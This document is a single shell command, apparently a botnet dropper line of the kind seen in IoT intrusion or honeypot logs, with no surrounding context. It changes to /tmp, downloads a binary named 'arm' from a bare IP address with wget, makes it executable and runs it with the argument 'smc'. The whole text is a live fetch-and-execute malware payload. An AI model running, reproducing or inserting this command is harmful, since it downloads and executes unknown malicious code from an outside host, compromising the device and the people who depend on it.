cd /tmp; wget http://45.95.146.126/arm; chmod 77 arm; ./arm smc
